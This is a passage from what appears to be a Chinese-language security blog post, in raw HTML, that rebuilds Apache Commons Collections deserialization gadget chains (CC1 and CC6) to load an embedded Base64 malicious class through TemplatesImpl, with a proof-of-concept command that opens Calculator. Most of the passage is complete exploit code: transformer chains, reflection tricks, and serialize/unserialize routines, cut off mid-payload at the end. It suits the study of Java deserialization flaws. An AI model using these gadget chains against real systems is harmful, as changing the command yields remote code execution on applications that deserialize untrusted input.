class=\"string\">&quot;yv66vgAAADQAMgcAJAoAAQAlCgAHACUKACYAJwgAKAoAJgApBwAqAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAlieXRlQ2xhc3MBACBMY29tL2dhcmNrM2gvY2NDaGFpbjMvQnl0ZUNsYXNzOwEACkV4Y2VwdGlvbnMHACsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAR0aGlzAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcALAEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAGPGluaXQ+AQADKClWAQAKU291cmNlRmlsZQEADkJ5dGVDbGFzcy5qYXZhAQAeY29tL2dhcmNrM2gvY2NDaGFpbjMvQnl0ZUNsYXNzDAAgACEHAC0MAC4ALwEAFm9wZW4gLWEgQ2FsY3VsYXRvci5hcHAMADAAMQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAEABwAAAAAABAAJAAgACQACAAoAAABBAAIAAgAAAAm7AAFZtwACTLEAAAACAAsAAAAKAAIAAAATAAgAFAAMAAAAFgACAAAACQANAA4AAAAIAAEADwAQAAEAEQAAAAQAAQASAAEAEwAUAAIACgAAAD8AAAADAAAAAbEAAAACAAsAAAAGAAEAAAAXAAwAAAAgAAMAAAABABUAEAAAAAAAAQAWABcAAQAAAAEAGAAZAAIAEQAAAAQAAQAaAAEAEwAbAAIACgAAAEkAAAAEAAAAAbEAAAACAAsAAAAGAAEAAAAaAAwAAAAqAAQAAAABABUAEAAAAAAAAQAWABcAAQAAAAEAHAAdAAIAAAABAB4AHwADABEAAAAEAAEAGgABACAAIQACAAoAAABAAAIAAQAAAA4qtwADuAAEEgW2AAZXsQAAAAIACwAAAA4AAwAAABsABAAcAA0AHQAMAAAADAABAAAADgAVABAAAAARAAAABAABABIAAQAiAAAAAgAj&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">TemplatesImpl</span> <span class=\"variable\">templates</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">TemplatesImpl</span>();</span><br><span class=\"line\">        setFieldValue(templates,<span class=\"string\">&quot;_class&quot;</span>,<span class=\"literal\">null</span>);</span><br><span class=\"line\">        setFieldValue(templates,<span class=\"string\">&quot;_name&quot;</span>,<span class=\"string\">&quot;qqq&quot;</span>);</span><br><span class=\"line\">        setFieldValue(templates,<span class=\"string\">&quot;_bytecodes&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">byte</span>[][]&#123;codes&#125;);</span><br><span class=\"line\">        setFieldValue(templates,<span class=\"string\">&quot;_tfactory&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">TransformerFactoryImpl</span>());</span><br><span class=\"line\"></span><br><span class=\"line\">        Transformer[] transformers = <span class=\"keyword\">new</span> <span class=\"title class_\">Transformer</span>[]&#123;</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">ConstantTransformer</span>(templates),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;newTransformer&quot;</span>,<span class=\"literal\">null</span>,<span class=\"literal\">null</span>)</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">ChainedTransformer</span>  <span class=\"variable\">chainedTransformer</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ChainedTransformer</span>(transformers);</span><br><span class=\"line\">        HashMap&lt;Object,Object&gt; map =  <span class=\"keyword\">new</span> <span class=\"title class_\">HashMap</span>&lt;&gt;();</span><br><span class=\"line\"></span><br><span class=\"line\">        map.put(<span class=\"string\">&quot;value&quot;</span>,<span class=\"string\">&quot;value&quot;</span>);</span><br><span class=\"line\">        Map&lt;Object,Object&gt; transformedMap=TransformedMap.decorate(map,<span class=\"literal\">null</span>,chainedTransformer);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        Class c=  Class.forName(<span class=\"string\">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class=\"line\">        Constructor constructor= c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class=\"line\"></span><br><span class=\"line\">        constructor.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        Object obj= constructor.newInstance(Target.class,transformedMap);</span><br><span class=\"line\"></span><br><span class=\"line\">        serialize(obj);</span><br><span class=\"line\">        unserialize();</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">serialize</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">ObjectOutputStream</span> <span class=\"variable\">outputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectOutputStream</span>( <span class=\"keyword\">new</span> <span class=\"title class_\">FileOutputStream</span>(<span class=\"string\">&quot;ser.bin&quot;</span>));</span><br><span class=\"line\">        outputStream.writeObject(obj);</span><br><span class=\"line\">        outputStream.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">unserialize</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span>  Exception&#123;</span><br><span class=\"line\">        <span class=\"type\">ObjectInputStream</span> <span class=\"variable\">inputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectInputStream</span>( <span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(<span class=\"string\">&quot;ser.bin&quot;</span>));</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">obj</span> <span class=\"operator\">=</span> inputStream.readObject();</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setFieldValue</span><span class=\"params\">(Object obj, String fieldName, Object value)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">Field</span> <span class=\"variable\">field</span> <span class=\"operator\">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class=\"line\">        field.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        field.set(obj, value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"qan42f18a6jlGRJYFGBaUjeP0qUZsGbp5_OE5xiGIZY.png\" alt=\"image\"></p>\n<h2 id=\"ysoserial-CC1使用TemplatesImpl实现执行命令\"><a href=\"#ysoserial-CC1使用TemplatesImpl实现执行命令\" class=\"headerlink\" title=\"ysoserial CC1使用TemplatesImpl实现执行命令\"></a>ysoserial CC1使用TemplatesImpl实现执行命令</h2><p>第二条改造后的CC1链，回顾一下其利用链</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">cc1 chain:</span><br><span class=\"line\">       ObjectInputStream.readObject()</span><br><span class=\"line\">            AnnotationInvocationHandler.readObject()</span><br><span class=\"line\">                Map(Proxy).entrySet()</span><br><span class=\"line\">                    AnnotationInvocationHandler.invoke()</span><br><span class=\"line\">                        LazyMap.get()</span><br><span class=\"line\">                            ChainedTransformer.transform()</span><br><span class=\"line\">                                ConstantTransformer.transform()</span><br><span class=\"line\">                                InvokerTransformer.transform()</span><br><span class=\"line\">                                    Method.invoke()</span><br><span class=\"line\">                                        Class.getMethod()</span><br><span class=\"line\">                                InvokerTransformer.transform()</span><br><span class=\"line\">                                    Method.invoke()</span><br><span class=\"line\">                                        Runtime.getRuntime()</span><br><span class=\"line\">                                InvokerTransformer.transform()</span><br><span class=\"line\">                                    Method.invoke()</span><br><span class=\"line\">                                        Runtime.exec()</span><br></pre></td></tr></table></figure>\n<p><img src=\"OpxgoW3QEHTmoPWiCNQQCKeIi8GNkT7z0-P2a7vVOmI.png\" alt=\"image\"></p>\n<p>也是修改成使用TemplatesImpl加载恶意类来实现执行命令</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.garck3h.ccChain3;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Base64;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.Transformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.FileInputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.FileOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectInputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Constructor;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.InvocationHandler;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Proxy;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">cc1_1</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">byte</span>[] codes = Base64.getDecoder().decode(<span class=\"string\">&quot;yv66vgAAADQAMgcAJAoAAQAlCgAHACUKACYAJwgAKAoAJgApBwAqAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAlieXRlQ2xhc3MBACBMY29tL2dhcmNrM2gvY2NDaGFpbjMvQnl0ZUNsYXNzOwEACkV4Y2VwdGlvbnMHACsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAR0aGlzAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcALAEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAGPGluaXQ+AQADKClWAQAKU291cmNlRmlsZQEADkJ5dGVDbGFzcy5qYXZhAQAeY29tL2dhcmNrM2gvY2NDaGFpbjMvQnl0ZUNsYXNzDAAgACEHAC0MAC4ALwEAFm9wZW4gLWEgQ2FsY3VsYXRvci5hcHAMADAAMQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAEABwAAAAAABAAJAAgACQACAAoAAABBAAIAAgAAAAm7AAFZtwACTLEAAAACAAsAAAAKAAIAAAATAAgAFAAMAAAAFgACAAAACQANAA4AAAAIAAEADwAQAAEAEQAAAAQAAQASAAEAEwAUAAIACgAAAD8AAAADAAAAAbEAAAACAAsAAAAGAAEAAAAXAAwAAAAgAAMAAAABABUAEAAAAAAAAQAWABcAAQAAAAEAGAAZAAIAEQAAAAQAAQAaAAEAEwAbAAIACgAAAEkAAAAEAAAAAbEAAAACAAsAAAAGAAEAAAAaAAwAAAAqAAQAAAABABUAEAAAAAAAAQAWABcAAQAAAAEAHAAdAAIAAAABAB4AHwADABEAAAAEAAEAGgABACAAIQACAAoAAABAAAIAAQAAAA4qtwADuAAEEgW2AAZXsQAAAAIACwAAAA4AAwAAABsABAAcAA0AHQAMAAAADAABAAAADgAVABAAAAARAAAABAABABIAAQAiAAAAAgAj&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">TemplatesImpl</span> <span class=\"variable\">templates</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">TemplatesImpl</span>();</span><br><span class=\"line\">        setFieldValue(templates,<span class=\"string\">&quot;_class&quot;</span>,<span class=\"literal\">null</span>);</span><br><span class=\"line\">        setFieldValue(templates,<span class=\"string\">&quot;_name&quot;</span>,<span class=\"string\">&quot;qqq&quot;</span>);</span><br><span class=\"line\">        setFieldValue(templates,<span class=\"string\">&quot;_bytecodes&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">byte</span>[][]&#123;codes&#125;);</span><br><span class=\"line\">        setFieldValue(templates,<span class=\"string\">&quot;_tfactory&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">TransformerFactoryImpl</span>());</span><br><span class=\"line\"></span><br><span class=\"line\">        Transformer[] transformers = <span class=\"keyword\">new</span> <span class=\"title class_\">Transformer</span>[]&#123;</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">ConstantTransformer</span>(templates),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;newTransformer&quot;</span>,<span class=\"literal\">null</span>,<span class=\"literal\">null</span>)</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">ChainedTransformer</span> <span class=\"variable\">chainedTransformer</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ChainedTransformer</span>(transformers);</span><br><span class=\"line\">        HashMap&lt;Object,Object&gt; map =  <span class=\"keyword\">new</span> <span class=\"title class_\">HashMap</span>&lt;&gt;();</span><br><span class=\"line\">        Map&lt;Object,Object&gt; lazydMap= LazyMap.decorate(map,chainedTransformer);</span><br><span class=\"line\"></span><br><span class=\"line\">        Class c=  Class.forName(<span class=\"string\">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class=\"line\">        Constructor constructor= c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class=\"line\">        constructor.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        <span class=\"type\">InvocationHandler</span> <span class=\"variable\">h</span> <span class=\"operator\">=</span> (InvocationHandler) constructor.newInstance(Override.class,lazydMap);</span><br><span class=\"line\">        <span class=\"type\">Map</span> <span class=\"variable\">mapProxy</span> <span class=\"operator\">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;Map.class&#125;,h);</span><br><span class=\"line\">        Object obj= constructor.newInstance(Override.class,mapProxy);</span><br><span class=\"line\"></span><br><span class=\"line\">        serialize(obj);</span><br><span class=\"line\">        unserialize();</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">serialize</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">ObjectOutputStream</span> <span class=\"variable\">outputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectOutputStream</span>( <span class=\"keyword\">new</span> <span class=\"title class_\">FileOutputStream</span>(<span class=\"string\">&quot;ser.bin&quot;</span>));</span><br><span class=\"line\">        outputStream.writeObject(obj);</span><br><span class=\"line\">        outputStream.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">unserialize</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span>  Exception&#123;</span><br><span class=\"line\">        <span class=\"type\">ObjectInputStream</span> <span class=\"variable\">inputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectInputStream</span>( <span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(<span class=\"string\">&quot;ser.bin&quot;</span>));</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">obj</span> <span class=\"operator\">=</span> inputStream.readObject();</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setFieldValue</span><span class=\"params\">(Object obj, String fieldName, Object value)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">Field</span> <span class=\"variable\">field</span> <span class=\"operator\">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class=\"line\">        field.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        field.set(obj, value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"R3KuXf0vGv6wZe_Q8KfsD1uyMDFIQiedynC1-_VmD5w.png\" alt=\"image\"></p>\n<h2 id=\"CC6使用TemplatesImpl实现执行命令\"><a href=\"#CC6使用TemplatesImpl实现执行命令\" class=\"headerlink\" title=\"CC6使用TemplatesImpl实现执行命令\"></a>CC6使用TemplatesImpl实现执行命令</h2><p>之前的分析了在高版本的jdk中，AnnotationInvocationHandler做了修改，所以需要一条新的链进行绕过，也就是我们分析的cc6，回顾一下它的利用链如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">cc6 chain:</span><br><span class=\"line\">java.io.ObjectInputStream.readObject()</span><br><span class=\"line\">    java.util.HashSet.readObject()</span><br><span class=\"line\">        java.util.HashMap.put()</span><br><span class=\"line\">        java.util.HashMap.hash()</span><br><span class=\"line\">            org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class=\"line\">            org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class=\"line\">                org.apache.commons.collections.map.LazyMap.get()</span><br><span class=\"line\">                    org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class=\"line\">                    org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class=\"line\">                    java.lang.reflect.Method.invoke()</span><br><span class=\"line\">                        java.lang.Runtime.exec()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>下面是修改为使用TemplatesImpl 加载字节码执行命令</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.garck3h.ccChain3;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.Transformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ConstantFactory;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.FileInputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.FileOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectInputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Base64;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by IntelliJ IDEA.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Author</span> Garck3h</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Date</span> 2023/8/6 10:58 上午</span></span><br><span class=\"line\"><span class=\"comment\"> * Life is endless, and there is no end to it.</span></span><br><span class=\"line\"><span class=\"comment\"> **/</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">cc6_1</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">byte</span>[] codes = Base64.getDecoder().decode(<span class=\"string\">&quot;yv66vgAAADQAMgcAJAoAAQAlCgAHACUKACYAJwgAKAoAJgApBwAqAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAlieXRlQ2xhc3MBACBMY29tL2dhcmNrM2gvY2NDaGFpbjMvQnl0ZUNsYXNzOwEACkV4Y2VwdGlvbnMHACsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAR0aGlzAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcALAEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAGPGluaXQ+AQADKClWAQAKU291cmNlRmlsZQEADkJ5dGVDbGFzcy5qYXZhAQAeY29tL2dhcmNrM2gvY2NDaGFpbjMvQnl0ZUNsYXNzDAAgACEHAC0MAC4ALwEAFm9wZW4gLWEgQ2FsY3VsYXRvci5hcHAMADAAMQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAEABwAAAAAABAAJAAgACQACAAoAAABBAAIAAgAAAAm7AAFZtwACTLEAAAACAAsAAAAKAAIAAAATAAgAFAAMAAAAFgACAAAACQANAA4AAAAIAAEADwAQAAEAEQAAAAQAAQASAAEAEwAUAAIACgAAAD8AAAADAAAAAbEAAAACAAsAAAAGAAEAAAAXAAwAAAAgAAMAAAABABUAEAAAAAAAAQAWABcAAQAAAAEAGAAZAAIAEQAAAAQAAQAaAAEAEwAbAAIACgAAAEkAAAAEAAAAAbEAAAACAAsAAAAGAAEAAAAaAAwAAAAqAAQAAAABABUAEAAAAAAAAQAWABcAAQAAAAEAHAAdAAIAAAABAB4AHwADABEAAAAEAAEAGgABACAAIQACAAoAAABAAAIAAQAAAA4qtwADuAAEEgW